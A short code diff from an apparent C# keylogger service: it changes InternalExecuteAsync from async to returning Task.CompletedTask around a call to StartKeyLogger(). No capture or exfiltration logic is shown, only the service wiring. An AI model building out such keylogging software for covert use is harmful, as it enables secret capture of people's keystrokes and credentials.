@@ -15,7 +15,7 @@
             _logger = logger;
         }
 
-        protected override async Task InternalExecuteAsync(CancellationToken cancellationToken)
+        protected override Task InternalExecuteAsync(CancellationToken cancellationToken)
         {
             Console.WriteLine("Execuing KeyloggerService InternalExecuteAsync");
             _logger.LogInformation("Test test test test");
@@ -24,6 +24,8 @@
             {
                 StartKeyLogger();
             }
+
+            return Task.CompletedTask;
         }
 
         protected void StartKeyLogger()
